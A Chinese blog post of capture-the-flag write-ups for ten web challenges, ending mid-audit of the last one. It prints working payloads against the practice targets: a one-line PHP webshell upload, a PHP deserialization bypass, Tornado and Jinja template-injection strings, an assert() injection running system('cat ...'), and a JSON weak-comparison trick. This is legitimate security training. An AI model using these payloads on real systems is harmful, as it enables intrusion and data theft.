<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CTF攻防世界 web进阶题 11-20 | MambaInVeins Blog</title><meta name="keywords" content="ctf"><meta name="author" content="MambaInVeins"><meta name="copyright" content="MambaInVeins"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="11. NaNNaNNaNNaN-Batman 12. PHP2 13. upload1 14. Web_php_unserialize 15. easytornado 16. shrine 17. lottery 18. mfw 19. web2 20. fakebook  ## NaNNaNNaNNaN-Batman  下载附件，有乱码，但可以发现是js代码。用浏览器打开出现一个搜索框，但">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF攻防世界 web进阶题 11-20">
<meta property="og:url" content="http://mambainveins.gitee.io/mambainveins/2020/08/04/2020/08/2020-08-04-CTF_world_web_advance_2/index.html">
<meta property="og:site_name" content="MambaInVeins Blog">
<meta property="og:description" content="11. NaNNaNNaNNaN-Batman 12. PHP2 13. upload1 14. Web_php_unserialize 15. easytornado 16. shrine 17. lottery 18. mfw 19. web2 20. fakebook  ## NaNNaNNaNNaN-Batman  下载附件，有乱码，但可以发现是js代码。用浏览器打开出现一个搜索框，但">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0189.png">
<meta property="article:published_time" content="2020-08-03T16:00:00.000Z">
<meta property="article:modified_time" content="2021-09-14T17:19:15.557Z">
<meta property="article:author" content="MambaInVeins">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0189.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://mambainveins.gitee.io/mambainveins/2020/08/04/2020/08/2020-08-04-CTF_world_web_advance_2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: MambaInVeins","link":"链接: ","source":"来源: MambaInVeins Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}

// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
const getScript = url => new Promise((resolve, reject) => {
  const script = document.createElement('script')
  script.src = url
  script.async = true
  script.onerror = reject
  script.onload = script.onreadystatechange = function() {
    const loadState = this.readyState
    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
    script.onload = script.onreadystatechange = null
    resolve()
  }
  document.head.appendChild(script)
})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2021-09-15 01:19:15'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}const fontSizeVal = saveToLocal.get('global-font-size')
if (fontSizeVal !== undefined) {
  document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
}})()</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/MambaInVeins.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">248</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">82</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">28</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/moment"><i class="fa-fw fas fa-comment-alt"></i><span> 碎语</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 常用链接</span></a></div><div class="menus_item"><a class="site-page" href="/box"><i class="fa-fw fas fa-box"></i><span> 工具箱</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0189.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">MambaInVeins Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/moment"><i class="fa-fw fas fa-comment-alt"></i><span> 碎语</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 常用链接</span></a></div><div class="menus_item"><a class="site-page" href="/box"><i class="fa-fw fas fa-box"></i><span> 工具箱</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTF攻防世界 web进阶题 11-20</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-03T16:00:00.000Z" title="发表于 2020-08-04 00:00:00">2020-08-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-09-14T17:19:15.557Z" title="更新于 2021-09-15 01:19:15">2021-09-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">98</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>1分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container">

11. NaNNaNNaNNaN-Batman
12. PHP2
13. upload1
14. Web_php_unserialize
15. easytornado
16. shrine
17. lottery
18. mfw
19. web2
20. fakebook

## NaNNaNNaNNaN-Batman

下载附件，有乱码，但可以发现是js代码。用浏览器打开出现一个搜索框，但没有什么反应。

    <script>_='function $(){e=getEleById("c").value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\'_ns=[t,n,r,i];for(o=0;o<13;++o){	[0]);.splice(0,1)}}}	\'<input id="c">< onclick=$()>Ok</>\');delete _var ","docu.)match(/"];/)!=null=["	write(s[o%4]buttonif(e.ment';for(Y in $='	')with(_.split($[Y]))_=join(pop());eval(_)</script>

审计代码可以看到最开始的下划线“\_”是一个变量，其内容是一个函数的代码，而最后又是一个eval(_)，这里执行了_变量中的内容也就是''中的内容。但是，要注意的是，它并没有执行$()函数，仅仅执行了字符串而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容。但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗（将eval函数改为alert），将乱码的$()函数源码完整显示出来。

    function $() {
        var e = document.getElementById("c").value;
        if (e.length == 16)
            if (e.match(/^be0f23/) != null)
                if (e.match(/233ac/) != null)
                    if (e.match(/e98aa$/) != null)
                        if (e.match(/c7be9/) != null) {
                            var t = ["fl", "s_a", "i", "e}"];
                            var n = ["a", "_h0l", "n"];
                            var r = ["g{", "e", "_0"];
                            var i = ["it'", "_", "n"];
                            var s = [t, n, r, i];
                            for (var o = 0; o < 13; ++o) {
                                document.write(s[o % 4][0]);
                                s[o % 4].splice(0, 1)
                            }
                        }
    }
    document.write('<input id="c"><button onclick=$()>Ok</button>');
    delete _

不用根据这些个变量和document.write去算flag，拿到flag有两种方法：

1）满足正则

首先，满足length==16，正则的话^为开始符号，$为结尾符号，拼接一下：be0f233ac7be98aa，输入就拿到flag了。

2）将下面这段拿到控制台执行一下即可：

    var t=["fl","s_a","i","e}"];
    var n=["a","_h0l","n"];
    var r=["g{","e","_0"];
    var i=["it'","_","n"];
    var s=[t,n,r,i];
    for(var o=0;o<13;++o){
        document.write(s[o%4][0]);s[o%4].splice(0,1)
        }

## PHP2

扫了下端口和目录，没发现啥有用的信息。看了提示，需要用到php源文件phps(之前没听说过)

访问index.phps 出现源码

    <?php
    if("admin"===$_GET[id]) {
    echo("<p>not allowed!</p>");
    exit();
    }

    $_GET[id] = urldecode($_GET[id]);
    if($_GET[id] == "admin")
    {
    echo "<p>Access granted!</p>";
    echo "<p>Key: xxxxxxx </p>";
    }
    ?>

    Can you anthenticate to this website?

payload:

    index.php?id=%2561%2564%256d%2569%256e
    index.php?id=%2561dmin

此处原理是php对传进来的参数id自动进行一次url解码，但"admin"===$_GET[id]返回false,然后urldecode再次对解码后的结果进行解码。

解码结果为admin。此时admin==admin，返回true,拿到flag.

此处附一张url编码表：

![](https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20190731140712210.png)

知识点：

    php备份文件：后缀为php~或者index.php.bak
    php的源代码文件：后缀为phps
    ===是包括变量值与类型完全相等，而==只是比较两个数的值是否相等



## upload1

选择文件上传，查看源码

    <!Doctype html>
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <script type="text/javascript">
    
    Array.prototype.contains = function (obj) {  
        var i = this.length;  
        while (i--) {  
            if (this[i] === obj) {  
                return true;  
            }  
        }  
        return false;  
    }  

    function check(){
    upfile = document.getElementById("upfile");
    submit = document.getElementById("submit");
    name = upfile.value;
    ext = name.replace(/^.+\./,'');
    if(['jpg','png'].contains(ext)){
        submit.disabled = false;
    }else{
        submit.disabled = true;
        alert('请选择一张图片文件上传!');
    }
    }
    </script>
    </head>

    <body>
    <form enctype='multipart/form-data' id='aa' name='aaa' method='post' action='index.php'> 
    <input  id="upfile" name='upfile' type='file' onchange="check();" /> 
    <input type='submit'  id ='submit' value='上传'> 
    </form> 
    </body>
    </html>

ext = name.replace(/^.+./,’’) 

删除文件的名称

if([‘jpg’,‘png’].contains(ext))

检查后缀是否为jpg，如果不是就禁用按钮并弹窗报错

过滤是在前端，所以我们编写一句话木马1.txt

<?php @eval($_POST['shell']);?>

并修改后缀为jpg或者png，之后上传。BP抓包之后改后缀名，放行。

发现返回网页 upload success : upload/1595487399.1.php 

此时菜刀连接http://220.249.52.133:37062/upload/1595487399.1.php ，看到有flag.php文件，访问后获得flag.

## Web_php_unserialize

题目

代码审计

    <?php 
    class Demo { 
        private $file = 'index.php';
        public function __construct($file) { 
            $this->file = $file;  //构造函数，对类的变量进行初始化
        }
        function __destruct() { 
            echo @highlight_file($this->file, true); 
        }

        //魔术方法，如果有反序列化的使用，在反序列化之前会先调用这个方法
        function __wakeup() { 
            if ($this->file != 'index.php') { 
                //the secret is in the fl4g.php
                $this->file = 'index.php'; 
            } 
        } 
    }
    if (isset($_GET['var'])) { 
        $var = base64_decode($_GET['var']); 

        //正则匹配，如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式})，不区分大小写，就输出stop hacking!否则的话就进行反序列化
        if (preg_match('/[oc]:\d+:/i', $var)) { 
            die('stop hacking!'); 
        } else {
            @unserialize($var); 
        } 
    } else { 
        highlight_file("index.php"); 
    } 
    ?>

审计完成之后，思路就很清晰了，对Demo这个类进行序列化，base64加密之后，赋值给var变量进行get传参就行了

在类Demo中有三个方法，一个构造，一个析构，还有就是一个魔术方法

构造函数__construct()在程序执行开始的时候对变量进行赋初值

析构函数__destruct()，在对象所在函数执行完成之后，会自动调用，这里就会高亮显示出文件。

在反序列化执行之前，会先执行__wakeup这个魔术方法，所以需要绕过，当成员属性数目大于实际数目时可绕过wakeup方法，正则匹配可以用+号来进行绕过。

代码：

    <?php 
    class Demo { 
        private $file = 'index.php';
        public function __construct($file) { 
            $this->file = $file; 
        }
        function __destruct() { 
            echo @highlight_file($this->file, true); 
        }
        function __wakeup() { 
            if ($this->file != 'index.php') { 
                //the secret is in the fl4g.php
                $this->file = 'index.php'; 
            } 
        } 
    }
        $A = new Demo('fl4g.php');
        $b = serialize($A);
        echo $b;
        $b = str_replace('O:4', 'O:+4',$b);//绕过preg_match
        echo $b;
        $b = str_replace(':1:', ':2:',$b);//绕过wakeup
        echo $b;
        echo base64_encode($b);
    ?>

利用php调试执行结果为：

    O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
    O:+4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
    O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}
    TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

用+4替换成4是为了绕过preg_match的正则表达式

同样的把2替换成1是利用了CVE-2016-7124的漏洞，即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行

这里有个坑，这里的file变量为私有变量，所以序列化之后的表示方式是在变量名前加上%00类名%00，字符串长度也比实际长度大2。类似的还有protected类型的变量，序列化之后字符串首部会加上%00*%00。

php是为了区别这些属性所以进行了一些修饰，利用的就是这个乱码%00（url编码，hex就是0x00），表示的是NULL。

最后按照题目的意思encode一下base64就获取反序列化的结果，get传参即可

    ?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

知识点：

[PHP反序列化漏洞简介及相关技巧小结](https://cloud.tencent.com/developer/article/1485821)


## easytornado

tornado是python中的一个web应用框架。

拿到题目发现有三个文件：

(1)flag.txt

    /flag.txt
    flag in /fllllllllllllag

发现flag在/fllllllllllllag文件里；

(2)welcome.txt

    /welcome.txt
    render

render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。

(3)hints.txt

    /hints.txt
    md5(cookie_secret+md5(filename))

filehash=md5(cookie_secret+md5(filename)) 

现在filename=/fllllllllllllag，只需要知道cookie_secret的既能访问flag。

测试后发现还有一个error界面，格式为/error?msg=Error，怀疑存在服务端模板注入攻击 （SSTI）

尝试/error?msg={{datetime}} 在Tornado的前端页面模板中，datetime是指向python中datetime这个模块，Tornado提供了一些对象别名来快速访问对象，可以参考Tornado官方文档

通过查阅文档发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个别名

    RequestHandler.settings
    An alias for self.application.settings.

handler指向的处理当前这个页面的RequestHandler对象， RequestHandler.settings指向self.application.settings， 因此handler.settings指向RequestHandler.application.settings。

构造payload获取cookie_secret

    http://220.249.52.133:49325/error?msg={{handler.settings}}

    {'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '300da6b0-b937-44a8-a3df-6a44a8660750'} 

计算filehash值:

    import hashlib

    def md5(s):
        return hashlib.md5(s).hexdigest()

    def filehash():
        filename = b'/fllllllllllllag'
        cookie_secret = '300da6b0-b937-44a8-a3df-6a44a8660750'
        print(md5((cookie_secret+md5(filename)).encode('utf-8')))

    if __name__ == '__main__':
        filehash()

payload：

    http://220.249.52.133:49325/file?filename=/fllllllllllllag&filehash=2238c86521369cdb6ef6b58d15dc9433

成功获取flag。

## shrine

源码

    import flask
    import os

    app = flask.Flask(__name__)
    app.config['FLAG'] = os.environ.pop('FLAG')

    @app.route('/')
    def index():
        return open(__file__).read()

    @app.route('/shrine/<path:shrine>')
    def shrine(shrine):

        def safe_jinja(s):
            s = s.replace('(', '').replace(')', '')
            blacklist = ['config', 'self']
            return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

        return flask.render_template_string(safe_jinja(shrine))

    if __name__ == '__main__':
        app.run(debug=True)

首先在shrine路径下测试ssti能正常执行

    http://220.249.52.133:31107/shrine/{{7*7}}

代码审计

    app.config['FLAG'] = os.environ.pop('FLAG')

注册了一个名为FLAG的config，猜测这就是flag，如果没有过滤可以直接{{config}}即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]，并且过滤了括号

    return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

上面这行代码把黑名单的东西遍历并设为空，例如：

    http://220.249.52.133:31107/shrine/{{config}}

返回结果

    None

不过python还有一些内置函数，比如url_for和get_flashed_messages

    http://220.249.52.133:31107/shrine/{{url_for.__globals__}}
    http://220.249.52.133:31107/shrine/{{get_flashed_messages.__globals__}}

看到current_app意思应该是当前app，查看当前app下的config，即payload：

    http://220.249.52.133:31107/shrine/{{url_for.__globals__['current_app'].config}}
    http://220.249.52.133:31107/shrine/{{get_flashed_messages.__globals__['current_app'].config}}


## lottery

考察 .git泄露、php源码审计、弱类型利用

打开链接发现是一个买彩票的网站，但是要买flag钱不够

使用dirsearch爆破url 

    python dirsearch.py -u http://220.249.52.133:41417 -e *

发现Git泄露,存在.git文件夹，这里使用工具GitHack，下载地址https://github.com/lijiejie/GitHack

打开api.php文件发现，里面有一段是抽奖的代码，主要是通过输入的数据和这里的随机数进行比较，看相等的数字，中的钱就越大，应用了弱比较==，这里没有进行任何过滤，可以用true绕过

![](https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/202085-43803.jpg)

    function buy($req){
        require_registered();
        require_min_money(2);

        $money = $_SESSION['money'];
        $numbers = $req['numbers'];
        $win_numbers = random_win_nums();
        $same_count = 0;
        for($i=0; $i<7; $i++){
            if($numbers[$i] == $win_numbers[$i]){
                $same_count++;
            }
        }
        switch ($same_count) {
            case 2:
                $prize = 5;
                break;
            case 3:
                $prize = 20;
                break;
            case 4:
                $prize = 300;
                break;
            case 5:
                $prize = 1800;
                break;
            case 6:
                $prize = 200000;
                break;
            case 7:
                $prize = 5000000;
                break;
            default:
                $prize = 0;
                break;
        }
        $money += $prize - 2;
        $_SESSION['money'] = $money;
        response(['status'=>'ok','numbers'=>$numbers, 'win_numbers'=>$win_numbers, 'money'=>$money, 'prize'=>$prize]);
    }

requests是json格式的,比较彩票数字与用户数字采用==弱比较,而且是一位一位的比较的,由于 json 支持布尔型数据，那么就可以构造一串数组[true,true,true,true,true,true,true]传入，因为布尔值true和任意字符串都弱相等。

![](https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/202085-44034.jpg)

PHP弱类型小知识 详细可以参考[php 弱类型总结](https://www.cnblogs.com/Mrsm1th/p/6745532.html)

    PHP有两种比较符号==与===

    === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较

    == 在进行比较的时候，会先将字符串类型转化成相同，再比较


在输入抽奖数字页面，进行抓包，把number的值改成数组

    {"action":"buy","numbers":[true,true,true,true,true,true,true]}

多go几下钱变多，就可以买flag了

![](https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/202085-44631.jpg)

## mfw

由About页面中提示 Git/PHP/Bootstrap 猜测可能有git泄漏

利用dirsearch跑一下，果然存在

githack下载泄漏源码

查看index.php文件内容得到PHP关键代码：

    <?php

    if (isset($_GET['page'])) {
        $page = $_GET['page'];
    } else {
        $page = "home";
    }

    $file = "templates/" . $page . ".php";

    // I heard '..' is dangerous!
    assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

    // TODO: Make this look nice
    assert("file_exists('$file')") or die("That file doesn't exist!");

    ?>
    
几个函数

    assert() 检查一个断言是否为 FALSE。 assert()函数会将括号中的字符当成代码来执行，并返回true或false。

    strpos() 函数查找字符串在另一字符串中第一次出现的位置。如果没有找到则返回False。代码中不允许输入的字符中包含连续的两个点，否则就返回错误。这段代码中只用黑名单过滤了连个点，我们可以想办法绕过。

    file_exists() 函数检查文件或目录是否存在。

注入处

    $file = "templates/" . $page . ".php";
    assert("strpos('$file', '..') === false") or die("Detected hacking attempt!"); 
    assert("file_exists('$file')") or die("That file doesn't exist!"); 

利用assert特性

    bool assert(mixed $assertion[,string $description])，如果assertion是字符串，他会被assert()当做php代码执行。 
    思路是通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码。

对strpos/file_exists函数进行闭合，构造一下

    ?page=') or phpinfo();//

    $file = "templates/') or phpinfo();//.php";
    assert("strpos('templates/') or phpinfo();//.php', '..') === false") or die("Detected hacking attempt!");
    assert("file_exists('templates/') or phpinfo();//.php')") or die("That file doesn't exist!"); 

构造payload，使用cat查看flag.php的内容，查看网页源码才能获取Flag

    ?page=') or system("cat templates/flag.php");//

    $file = "templates/') or system("cat templates/flag.php");//.php";
    assert("strpos('templates/') or system("cat templates/flag.php");//.php', '..') === false") or die("Detected hacking attempt!");
    assert("file_exists('templates/') or system("cat templates/flag.php");//.php") or die("That file doesn't exist!"); 

## web2

把给出的字符串逆向解密就能得到flag

简单审计一下代码

    <?php
    $miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";

    function encode($str){	
        $_o=strrev($str);  //反转字符串
        // echo $_o;
            
        for($_0=0;$_0<strlen($_o);$_0++){  //循环字符串长度
        
            $_c=substr($_o,$_0,1);  //从$_0位置开始，返回1个字符

            $__=ord($_c)+1;  //返回字符串首个字母的ASCII值 + 1

            $_c=chr($__);  //返回指定进制的ASCII值

            $_=$_.$_c;   //拼接两个变量的内容 赋值
        } 
        return str_rot13(strrev(base64_encode($_)));  //返回  ROT13 编码/解码(反转字符串(base64加密($_)))  的结果
    }

    highlight_file(__FILE__);  //返回高亮代码
    /*
    逆向加密算法，解密$miwen就是flag
    */
    ?>  

PHP内置函数

    strrev(string): 反转字符串

    strlen(string): 返回字符串的长度

    substr(string, start, length): 返回字符串的一部分
        string: 所需要的字符串
        start: 在字符串何处开始
        length: 可选。规定被返回字符串的长度。默认是直到字符串的结尾

    ord(string): 返回字符串首个字符的 ASCII 值

    chr(): 从指定的 ASCII 值返回对应的字符

    str_rot13(string): 对字符串执行 ROT13 编码。ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。编码和解码都是由该函数完成的。如果把已编码的字符串作为参数，那么将返回原始字符串

    base64_encode(string): 使用 MIME base64 对数据进行编码

写出逆向代码

    <?php
    $str='a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';
    $_ = base64_decode(strrev(str_rot13($str)));

    $_o=NULL;
    for($_0=0;$_0<strlen($_);$_0++){  

            $_c=substr($_,$_0,1);  

            $__=ord($_c)-1;  

            $_c=chr($__);  

            $_o=$_o.$_c;   
        } 


    echo strrev($_o);

    ?>

## fakebook

参考：https://blog.csdn.net/qq_41500251/article/details/105383065?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-2-105383065.nonecase

扫描目录 dirsearch 御剑

发现隐藏的robots.txt和flag.php

查看flag.php，但是响应内容为空。如果我们确定了一个页面存在，访问后页面内容为空，有两种情况，要么页面本身就没有内容。再来就是没有访问权限，服务器禁止通过HTTP直接请求flag.php文件。那接下来我们所有的思路就可以明确，就是要找系统中能够访问flag.php的其他方式。（SSRF，服务器端请求伪造，全称Server-Side Request Forgery，是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。现在，我们通过浏览器直接访问flag.php内容并不返回内容，这个请求对于服务器来说是外部请求。当攻击者可以通过SSRF让服务器内部功能访问flag文件时，这种外部禁止访问的限制也就会相应消失。）

再来看robots.txt，其中有源码泄漏（/user.php.bak），输入到地址栏，得到文件user.php.bak。

user.php.bak源码：

    <?php

    class UserInfo
    {

        public $name = "";
        public $age = 0;
        public $blog = "";

        public function __construct($name, $age, $blog)
        {
            $this->name = $name;
            $this->age = (int)$age;
            $this->blog = $blog;
        }

        function get($url)
        {
            $ch = curl_init();                                   //初始化一个curl会话

            curl_setopt($ch, CURLOPT_URL, $url);                 //设置需要抓取的URL
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);         //设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上
            $output = curl_exec($ch);                            //运行cURL，请求网页
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if($httpCode == 404) {
                return 404;
            }
            curl_close($ch);          //关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄

            return $output;
        }

        public function getBlogContents ()
        {
            return $this->get($this->blog);
        }

        public function isValidBlog ()
        {
            $blog = $this->blog;
            return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
        }

    }

审计源码

